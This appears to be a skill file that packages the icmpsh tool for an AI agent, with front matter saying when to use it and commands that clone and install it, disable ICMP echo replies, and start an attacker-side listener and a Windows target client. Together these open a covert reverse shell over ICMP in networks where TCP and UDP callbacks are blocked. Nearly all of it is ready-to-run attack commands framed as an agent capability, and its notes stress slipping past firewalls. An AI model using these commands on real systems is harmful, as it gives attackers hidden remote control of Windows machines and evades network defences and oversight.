---
name: icmpsh-reverse
description: "icmpsh provides an ICMP covert reverse shell. Signals: covert callback, communication channel, Python listener, Windows target, latency ms."
zh-signals: "icmpsh: ICMP 隐蔽反弹 shell。信号:隐蔽回连,通信通道,监听端(Python),Windows 目标端,延迟 ms。"
when-to-use: >-
  Use when you need a covert reverse shell channel over ICMP in a restricted
  network where TCP and UDP callbacks are blocked, with a Linux listener and
  Windows target.
---

# icmpsh

- Attack Category: C36 Covert Callback and Communication Channels
- Upstream Repository: https://github.com/bdamele/icmpsh
- Upstream License: NOASSERTION (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/bdamele/icmpsh && sysctl -w net.ipv4.icmp_echo_ignore_all=1
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `./icmpsh_m.py 10.8.0.2 10.0.0.5` | Listener side (Python) |
| `icmpsh.exe -t 10.8.0.2` | Windows target side |
| `-d 500` | Latency in ms |

## Attack Scenario Playbook

### ICMP Covert Reverse Shell

```bash
./icmpsh_m.py 10.8.0.2 10.0.0.5  # attacker machine
icmpsh.exe -t 10.8.0.2          # target machine (no listener process)
```

## Notes

Pure ICMP communication with no listening port, and most firewalls allow ping by default; the target side is a single dependency-free exe.
